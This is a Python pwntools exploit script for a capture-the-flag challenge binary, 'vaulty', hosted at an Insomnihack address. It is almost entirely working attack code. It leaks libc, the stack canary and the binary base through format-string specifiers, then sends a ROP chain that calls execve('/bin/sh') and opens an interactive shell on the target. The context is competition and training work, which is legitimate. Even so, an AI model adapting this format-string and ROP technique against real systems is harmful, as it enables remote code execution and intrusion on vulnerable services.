#!/usr/bin/env python3

from pwn import *

exe = ELF("vaulty_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("vaulty.insomnihack.ch", 4556)

    return r

r = conn()

sa   = lambda a,b : r.sendafter(a,b)
sla  = lambda a,b : r.sendlineafter(a,b)
sd   = lambda a,b : r.send(a,b)
sl   = lambda a : r.sendline(a)
ru   = lambda a : r.recvuntil(a, drop=True)
rc   = lambda : r.recv(4096)
uu32 = lambda data : u32(data.ljust(4, b'\0'))
uu64 = lambda data : u64(data.ljust(8, b'\0'))

def alloc(username, password, url):
    sla(b"):\n", "1")
    sla(b":", username)
    sla(b":", password)
    sla(b":", url)

def print_thing(index):
    sla(b"):\n", "4")
    sla(b":", f"{index}")

def leak(index):
    print_thing(index)

def enum():
    global r
    r.close()
    for i in range(10,100):
        try:
            r = process("./vaulty_patched")
            alloc(f"AAAAAAAAAAAAA %{i}$p","1","1")
            leak(0)
            ru(b"AAAA ")
            lol = int(r.recvline().strip(), 16)
            log.info(f"{i}: {hex(lol)}")
            r.close()
        except:
            r.close()
    gdb.attach(r)


libc_off = 0x114697
pop_rdi = 0x000000000002a3e5 #: pop rdi; ret; 
pop_rsi = 0x000000000002be51 #: pop rsi; ret;
pop_rax = 0x0000000000045eb0 #: pop rax; ret; 
pop_rdx = 0x00000000000796a2 #: pop rdx; ret; 
syscall = 0x0000000000091316 #: syscall; ret; 
bin_sh = 0x1D8678




def main():
    #enum()
    alloc("%3$p","1","1")
    leak(0)
    ru(b"Username:")
    libc = int(r.recvline().strip(), 16) - libc_off
    log.info(f"libc: {hex(libc)}")
    alloc("%11$p","1","1")
    leak(1)
    ru(b"Username:")
    canary = int(r.recvline().strip(), 16)
    log.info(f"canary: {hex(canary)}")
    alloc("%13$p","1","1")
    leak(2)
    ru(b"Username:")
    base = int(r.recvline().strip(), 16) - 0x1984
    log.info(f"base: {hex(base)}")

    #gdb.attach(r)

    rop = p64(0x4242424242424242)*5
    rop += p64(canary)
    rop += p64(0)*3
    rop += p64(libc + pop_rdi)
    rop += p64(libc + bin_sh)
    rop += p64(libc + pop_rsi)
    rop += p64(0)
    rop += p64(libc + pop_rdx)
    rop += p64(0)
    rop += p64(libc + pop_rax)
    rop += p64(0x3b)
    rop += p64(libc + syscall)
    alloc("lol", "lol", rop)



    r.interactive()


if __name__ == "__main__":
    main()
